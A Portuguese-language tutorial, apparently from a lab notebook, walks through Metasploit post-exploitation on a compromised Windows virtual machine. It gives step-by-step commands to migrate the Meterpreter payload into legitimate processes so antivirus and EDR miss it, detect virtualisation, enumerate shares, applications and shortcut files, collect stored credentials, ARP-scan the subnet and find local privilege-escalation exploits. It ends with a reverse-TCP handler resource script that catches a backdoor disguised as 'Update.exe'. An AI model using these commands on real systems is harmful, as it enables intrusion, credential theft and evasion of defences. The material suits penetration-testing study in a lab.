## Pós-exploração em sistemas comprometidos

Todos estes comandos foram executados conforme sequência abaixo.

### 1º - Migrando automaticamente para outro processo em execução no sistema alvo (PID)

1 - Criar e estabelecer uma nova sessão/conexão com a máquina alvo (Windows)

2 - Comando: background (para sair da sessão/conexão onde eu estava, caso esteja conectado em outra sessão)

3 - Comando: use post/windows/manage/migrate 

Este comando serve para carregar um módulo de pós-exploração que migra AUTOMATICAMENTE o payload do Meterpreter para outro processo em execução no sistema Windows comprometido. O payload inicial, muitas vezes, é executado em um processo suspeito ou de curta duração, que pode ser facilmente identificado por softwares de segurança (antivírus, EDR). 
Migrar o payload para um processo legítimo e estável (como explorer.exe, svchost.exe ou winlogon.exe) ajuda a ofuscar sua presença e a evitar que a sessão seja encerrada, aumentando as chances de manter o acesso ao sistema por mais tempo.

4 - Comando: show options (visualizar quais parâmetros/requisitos eu preciso preencher). Neste exemplo identificamos que o único requisito é que a sessão seja definida. 

![background](https://i.imgur.com/s15drH4.jpeg) 

5 - Comando: set session 1 (defino a sessão).

Comando: run (ao executar este comando ele migra automaticamente para outro PID. PID é o Process Identifier (Identificador de Processo). É um número exclusivo atribuído a cada processo em execução no sistema operacional da máquina alvo). 

![set](https://i.imgur.com/Hr7oYyj.jpeg)

6 - Comando: sessions 1 (entro novamente nesta sessão/conexão antes de rodar o comando ps)

7 - Comando: ps (este comando exibe uma lista dos processos em execução no sistema, fornecendo informações como o ID do processo (PID), o usuário que o iniciou, o uso de CPU e memória, e o comando que o iniciou.

Neste exemplo vimos que meu novo número PID é o 292 e migrou para o processo notepad.exe.

![ps](https://i.imgur.com/QAEMt5j.jpeg)

&nbsp;

### 2º - Verificando se o sistema invadido é uma Máquina Virtual (VM)

1 - Comando: background (serve para colocar a sessão atual em segundo plano, retornando o controle para o console principal do msfconsole. Isso permite que o usuário gerencie múltiplas sessões simultaneamente e execute outras tarefas no Metasploit sem fechar a sessão comprometida).

2 - Comando: use post/windows/gather/checkvm (verifica se o sistema Windows comprometido (onde já temos uma sessão ativa, como uma sessão Meterpreter) está sendo executado dentro de uma máquina virtual (VM).

3 - Comando: set session 1 (especifica qual sessão ativa deve ser utilizada por um módulo, geralmente um módulo de pós-exploração. Neste exemplo nossa sessão escolhida é a 3).

4 - Comando: run (serve para executar módulos auxiliares (auxiliary modules) ou para iniciar a execução de um exploit).

Neste exemplo vemos que o Windows comprometido está sendo executado dentro de uma VM.

![run](https://i.imgur.com/GffSgN7.jpeg)

&nbsp;

### 3º - Identificando as pastas compartilhadas (shares)

1 - Comando: use post/windows/gather/enum_shares (este comando enumera os compartilhamentos de rede (shares) disponíveis em um sistema Windows comprometido). 

2 - Comando: set session 1 (escolhe a sessão)

3 - Comando: exploit (roda o comando)

Neste exemplo não foi encontrada nenhuma pasta compartilhada.

![exploit](https://i.imgur.com/K4hc6XY.jpeg)

&nbsp;

### 4º - Enumerando os softwares instalados no Windows comprometido

1 - Comando: use post/windows/gather/enum_applications 

2 - Comando: set session 1

3 - run 

![set](https://i.imgur.com/LqXnRLr.jpeg)

&nbsp;

### 5º - Verificando tudo o que o usuário acessou na máquina

1 - Comando: use post/windows/gather/dumplinks (este comando enumera e extrai informações dos arquivos de atalho (.lnk) encontrados no sistema comprometido. Os arquivos de atalho podem conter dados valiosos sobre arquivos e pastas acessados recentemente, incluindo caminhos de rede e locais de armazenamento, o que pode ajudar o pentester a entender melhor a estrutura do sistema e identificar outros alvos em potencial na rede. 

2 - Comando: set session 1

3 - run 

![dumplinks](https://i.imgur.com/bu5nkhr.jpeg)

&nbsp;

### 6º - Coletando credenciais armazenadas no sistema Windows comprometido e armazenando-as no banco de dados do Metasploit. 

1 - Comando: use post/windows/gather/credentials/credential_collector 

2 - Comando: show options (verifica os requisitos pra rodar o comando. Neste exemplo ele só pede a sessão, então vamos setar a sessão)

3 - Comando: set session 1

4 - Comando: run

![credential](https://i.imgur.com/PSB1eIX.jpeg)

&nbsp;

### 7º - Reunindo informações detalhadas sobre os aplicativos instalados em um sistema operacional Windows comprometido. 

1 - Comando: use post/windows/gather/arp_scanner

2 - Comando: show options (o comando pede um range ou identificador CIDR como requisito pra rodar).

3 - Comando: set RHOSTS 192.168.56.1/24 (varre o range de IP's da minha sub rede)

4 - Comando: show options (pra confirmar se foi preenchido o requisito)

5 - Comando: set session 1 

6 - Comando: run 

![arp](https://i.imgur.com/LdhAcmt.jpeg)

&nbsp;

![arp1](https://i.imgur.com/NOOA0v2.jpeg)

&nbsp;

### 8º - Sugerindo automaticamente exploits locais para elevar privilégios no sistema comprometido.  

1 - Comando: use post/multi/recon/local_exploit_suggester (este comando lista os exploits locais que provavelmente funcionarão para aquela configuração específica de sistema, aumentando as chances de sucesso na elevação de privilégios (por exemplo, para obter acesso de root ou SYSTEM)). 

2 - Comando: set session 1

3 - Comando: show options (Identificamos que precisamos alterar o SHOWDESCRIPTION de false para true).

4 - Comando: set SHOWDESCRIPTION true (alterando para true ele vai descrever os exploits que encontrar).

5 - Comando: show options (confirmar se deu certo a alteração)

5 - run (demora um pouco essa varredura)

![suggester](https://i.imgur.com/oz9YE7U.jpeg)

&nbsp;

![result](https://i.imgur.com/FIrCwKT.jpeg)

&nbsp;

### 9º - Criando e rodando scripts - estabelecendo a sessão/conexão com a máquina alvo através de scripts.

1 - Abrir o backdoor Update.exe no windows, que criamos nas etapas anteriores, e deixá-lo rodando.

2 - Comando: nano meterpreter.rc (cria um arquivo de comandos. Usado para abrir ou criar um arquivo de script de recurso (.rc) para o Metasploit Framework usando o editor de texto de linha de comando Nano. Vamos escrever os comandos dentro deste arquivo).

![meterpreter](https://i.imgur.com/SI3O4WB.jpeg)

2 - Dentro do arquivo meterpreter.rc vamos escrever os seguintes comandos do nosso script:

- use exploit/multi/handler

- set payload windows/meterpreter/reverse_tcp

- set lhost 192.168.56.102 (ip da minha máquina, que vai receber a conexão)

- set lport 4444 (tem que ser a mesma porta do backdoor para eles se encontrarem)

- exploit -z (vai jogar para background)

![exploit](https://i.imgur.com/BEJPlGQ.jpeg)

3 - Comando: msfconsole -r meterpreter.rc (roda o script)

![msfconsole](https://i.imgur.com/AOVn0y3.jpeg)

4 - Abrir o backdoor no Windows (duplo clique no arquivo Update.exe). Ao fazermos ele cria a sessão e envia para background automaticamente.

5 - Comando: sessions (listar as sessões criadas)

6 - Comando: sessions 1 (entrei na máquina alvo)

![sessions](https://i.imgur.com/YtCPd5Z.jpeg)

7 - Comando: sysinfo (confirma que estamos dentro da máquina alvo)

![sysinfo](https://i.imgur.com/hvLJVV6.jpeg)

&nbsp;
